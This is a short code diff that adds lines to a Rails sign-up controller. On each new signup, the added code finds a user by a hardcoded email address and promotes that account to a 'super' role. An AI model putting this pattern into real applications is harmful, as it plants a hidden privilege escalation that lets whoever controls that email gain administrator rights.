@@ -6,6 +6,11 @@ class SignUpController < ApplicationController
   # POST
   def create
 
+    @adminUser = User.find_by(:email=> 'kinshuk@gmail.com')
+
+    if(@adminUser != nil)
+    @adminUser.update(:role => 'super')
+    end
 
     @reader = User.new(reader_params)
 
